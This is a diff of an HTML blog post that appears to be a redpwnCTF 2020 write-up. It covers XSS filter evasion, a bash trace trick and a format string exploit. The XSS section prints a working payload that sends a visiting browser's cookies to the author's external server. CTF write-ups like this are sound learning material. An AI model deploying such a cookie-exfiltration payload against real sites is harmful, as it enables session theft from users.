@@ -152,7 +152,7 @@ The way this challenge worked is that you could send any page with 'issues' to t
 It became clear that it would be possible to inject markup into the paste page, however it was not quite as simple as being able to enter '<script src="evil.js"></script>' as the input was 'sanitised' before it was outputted to the page. Thankfully the input sanitation was not all that sophisticated and simply counted '<' and '>' characters to try and prevent you opening tags. This made it a bit harder to do a script tag, as anything after the close '>' would not be echoed to the page. <br>
 This meant we needed an XSS vector that executed before the close tag. I tried a couple of different ones, I got one working eventually and submitted it to be visited by the bot. Unfortunately this didn't work, I did a bit more digging and saw that the method I used to inject JS didn't work in Chrome, which I assume is what the bot was running. So back to the drawing board, and after visiting an excellent <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS cheat sheet</a> I found one that seemed to work on Chrome and ended up with this as my exploit code:<br>
 <pre><code class="html">
-><img src=x onerror=eval(fetch(https://hack.etopiei.com/cookies/${btoa(document.cookie.split(';'))}))>
+&gt;&lt;img src=x onerror=eval(fetch(https://hack.etopiei.com/cookies/${btoa(document.cookie.split(&#39;;&#39;))}))&gt;
 </code></pre><br>
 I set up a quick express server to listen and log the cookies that I stole and after the bot visited the flag popped up in the console. Another challenge done. <br><br>
 Quick side note, you may notice the extra '>' at the start of the payload above, that was to ensure that the bracket count was correct when the img tag was being read by the sanitiser.<br><br>
@@ -166,7 +166,7 @@ set -x
 trap read debug
 </code></pre><br>
 At the beginning of the script, and by doing this I saw the following when I saved the text output and grepped for the results:<br>
-<img alt="bash-flag" src="uglybash.png"><br>
+<img alt="bash-flag" src="img/uglybash.png"><br>
 So, although I didn't use zsh, the flag was mine. I'll be curious to read how other people solved this challenge though.<br><br>
 </p>
 <h2>misc/CaaSiNO</h2>
@@ -238,7 +238,13 @@ int main() {
 }
 </code></pre><br>
 So it seems we have a format string vulnerability, which I think I've only exploited once before so this was a bit of a learning experience. After reading a couple of articles and papers (<a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">paper</a>, <a href="https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf">tutorial</a>, <a href="https://security.stackexchange.com/questions/153583/how-to-leak-addresses-with-format-string-exploits">stack exchange post</a>) I felt pretty confident I could exploit this, and thankfully it was a near identical situation to <a href="https://teambi0s.gitlab.io/bi0s-wiki/pwning/format-string/leak/">this article</a> so I utilised what I'd learnt there and got the flag in the end.<br>
-<img src="string-exploit.png" alt="Format String Exploit"><br>
+<img src="img/string-exploit.png" alt="Format String Exploit"><br>
 And that was the final challenge I completed. All in all it was a very enjoyable CTF, I liked learning new things and will try be more involved in CTF competitions in future. I think our team came 250th overall which is pretty good. Thanks to the team, and the organisers for a great event. To see any of the other challenges, or read some other write-ups check out <a href="https://github.com/redpwn/redpwnctf-2020-challenges">redpwn's GitHub</a> and thanks for reading.<br><br>
 - etopiei (26/6/2020)
 </p>
+<style>
+pre {
+	line-height: initial;
+	font-size: initial;
+}
+</style>
